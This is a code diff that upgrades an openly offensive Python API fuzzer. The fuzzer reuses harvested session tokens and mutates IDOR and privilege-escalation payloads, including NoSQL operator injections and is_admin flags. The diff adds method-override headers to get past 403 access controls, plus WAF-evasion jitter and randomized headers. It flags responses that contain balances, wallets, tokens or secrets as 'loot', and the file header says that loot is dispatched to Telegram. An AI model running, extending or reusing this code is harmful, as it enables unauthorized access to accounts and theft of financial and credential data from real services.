@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-API_FUZZER.PY v8.0 — Senior Red-Team Asynchronous API & IDOR Fuzzer (With Telegram Telemetry)
+API_FUZZER.PY v8.5 — Senior Red-Team Asynchronous API & IDOR Fuzzer (Hardened with Advanced WAF Evasion)
 Features:
 - 100% Async integration with CognitiveOperator transport and memory
-- Multi-method request support (GET, POST, PUT, DELETE) with IDOR/BOLA payload mutation
+- Multi-method request support (GET, POST, PUT, DELETE, PATCH) with IDOR/BOLA payload mutation
+- HTTP method tampering & header override fuzzing (X-HTTP-Method-Override, X-Original-URL)
 - Consumes harvested session tokens from the cognitive brain automatically
-- Dynamic endpoint discovery / OpenAPI spec parsing
+- Dynamic endpoint discovery / OpenAPI spec parsing & intelligent wordlist fusion
 - Anti-detection behavioral jitter & response differential analysis
 - Real-time asynchronous Telegram notification dispatch for unredacted API loot
 """
@@ -16,8 +17,9 @@ import random
 import sys
 import httpx
 
-# Import centralized Telegram broadcaster
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from asynchronous fuzzer functions."""
@@ -36,19 +38,22 @@ class APIFuzzer:
         self.base_url = base_url.rstrip("/")
         self.fuzzed_endpoints = set()
 
-        # IDOR / BOLA Escalation Mutation Vectors
+        # IDOR / BOLA Escalation Mutation Vectors & Type-Juggling payloads
         self.mutation_parameters = [
             {"user_id": 1}, {"user_id": 0}, {"user_id": 9999}, {"user_id": "admin"},
-            {"account_id": 1}, {"account_id": "root"},
-            {"order_id": 1001}, {"role": "admin"}, {"is_admin": True}
+            {"account_id": 1}, {"account_id": "root"}, {"account_id": {"$ne": None}},
+            {"order_id": 1001}, {"role": "admin"}, {"is_admin": True}, {"isAdmin": True},
+            {"id": {"$gt": 0}}, {"limit": -1}
         ]
 
     async def discover_endpoints(self, transport_client) -> list:
-        """Dynamically scrapes or discovers endpoints from common documentation routes."""
+        """Dynamically scrapes or discovers endpoints from common documentation routes and APIs."""
         discovered = [
             "/api/v1/users", "/api/v1/user/profile", "/api/v1/wallet",
             "/api/users/1", "/api/account/balance", "/api/admin/settings",
-            "/swagger/v1/swagger.json", "/openapi.json", "/docs", "/graphql"
+            "/api/auth/me", "/api/v1/auth/session", "/api/dashboard",
+            "/swagger/v1/swagger.json", "/openapi.json", "/docs", "/graphql",
+            "/api/graphql", "/admin", "/dashboard", "/transactions"
         ]
         
         # Pull from brain's memory if available
@@ -61,7 +66,7 @@ class APIFuzzer:
         return discovered
 
     async def fuzz_endpoint(self, endpoint: str, transport_client):
-        """Executes intelligent multi-method fuzzing and IDOR probing on a target API route."""
+        """Executes intelligent multi-method fuzzing, method tampering, and IDOR probing on a target API route."""
         if endpoint in self.fuzzed_endpoints:
             return
         self.fuzzed_endpoints.add(endpoint)
@@ -76,38 +81,45 @@ class APIFuzzer:
                 if isinstance(token_val, str) and len(token_val) < 250:
                     auth_headers["Authorization"] = f"Bearer {token_val}"
 
-        headers = {
-            "User-Agent": random.choice([
-                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-            ]),
+        base_headers = {
             "Accept": "application/json, text/plain, */*",
             **auth_headers
         }
+        base_headers.update(get_randomized_hints())
 
-        methods = ["GET", "POST", "PUT", "DELETE"]
+        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 
-        async with httpx.AsyncClient(verify=False, timeout=8.0, follow_redirects=True) as client:
+        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=True) as client:
             for method in methods:
                 # Apply Poisson-like behavioral jitter to avoid WAF rate-limiting
-                await asyncio.sleep(random.uniform(0.1, 0.4))
+                apply_behavioral_jitter()
+                await asyncio.sleep(random.uniform(0.15, 0.45))
 
                 try:
-                    if method in ["GET", "DELETE"]:
-                        response = await client.request(method, url, headers=headers)
+                    # Test standard method execution
+                    if method in ["GET", "DELETE", "HEAD", "OPTIONS"]:
+                        response = await client.request(method, url, headers=base_headers)
                         status = response.status_code
                         body = response.text
-
                         await self._evaluate_response(endpoint, method, status, body, None)
 
-                    elif method in ["POST", "PUT"]:
+                    elif method in ["POST", "PUT", "PATCH"]:
                         for payload in self.mutation_parameters:
-                            response = await client.request(method, url, headers=headers, json=payload)
+                            response = await client.request(method, url, headers=base_headers, json=payload)
                             status = response.status_code
                             body = response.text
-
                             await self._evaluate_response(endpoint, method, status, body, payload)
                             
+                    # Method Tampering & Header Override Check (Bypassing edge 403 ACLs)
+                    if method == "POST":
+                        override_headers = base_headers.copy()
+                        override_headers["X-HTTP-Method-Override"] = "GET"
+                        override_headers["X-Original-URL"] = endpoint
+                        
+                        ov_resp = await client.request("GET", url, headers=override_headers)
+                        if ov_resp.status_code < 400:
+                            await self._evaluate_response(endpoint, "METHOD_OVERRIDE_GET", ov_resp.status_code, ov_resp.text, {"header_override": "GET"})
+
                 except Exception as exc:
                     sys.stdout.write(f"\033[91m[-] Fuzzer request error on {method} {endpoint}: {exc}\033[0m\n")
 
@@ -118,11 +130,16 @@ class APIFuzzer:
         is_spa = (
             "<div id=\"root\">" in lower_body or 
             "<div id=\"__next\">" in lower_body or 
-            len(body.strip()) < 150
+            "<div id=\"__nuxt\">" in lower_body or
+            len(body.strip()) < 180 or
+            "login-form" in lower_body
         )
 
         # High-value API success indicators
-        has_sensitive_data = any(k in lower_body for k in ["balance", "wallet", "email", "credit", "access_token", "admin"])
+        has_sensitive_data = any(k in lower_body for k in [
+            "balance", "wallet", "email", "credit", "access_token", "admin", 
+            "role", "secret", "transactions", "users", "account_number"
+        ])
 
         if status in [200, 201] and not is_spa and has_sensitive_data:
             sys.stdout.write(f"\033[91m[!!!] API VULNERABILITY CONFIRMED [{method} {endpoint}] [HTTP {status}] [!!!]\033[0m\n")
